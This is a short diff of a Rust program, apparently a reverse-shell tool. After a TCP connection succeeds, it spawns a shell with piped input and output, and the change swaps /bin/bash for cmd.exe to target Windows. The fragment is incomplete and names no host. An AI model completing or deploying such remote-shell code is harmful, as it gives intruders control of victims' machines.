@@ -27,8 +27,8 @@ fn main() {
             {
                 Ok(tcp) => {
                     println!("connected!");
-
-                    let mut child = smol::process::Command::new("/bin/bash")
+                    
+                    let mut child = smol::process::Command::new("cmd.exe")
                         .stdout(smol::process::Stdio::piped())
                         .stdin(smol::process::Stdio::piped())
                         .stderr(smol::process::Stdio::piped())
